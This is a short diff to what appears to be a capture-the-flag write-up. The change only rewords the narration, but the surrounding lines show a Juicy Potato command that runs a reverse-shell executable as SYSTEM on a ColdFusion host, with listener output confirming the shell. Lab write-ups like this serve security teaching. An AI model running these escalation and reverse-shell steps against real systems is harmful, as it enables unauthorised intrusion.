@@ -586,6 +586,8 @@ Time to use this binary to execute our `revshell.exe` executable as `NT AUTHORIT
 C:\ColdFusion8\runtime\bin> C:\tmp\juicy_potato.exe -l 1337 -p C:\tmp\revshell.exe -t *
 ```
 
+And on our listener...
+
 ```
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.11] 49344
 Microsoft Windows [Version 6.1.7600]
@@ -594,7 +596,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>
 ```
 
-Our listener caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
+It caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
 
 # Local enumeration
 
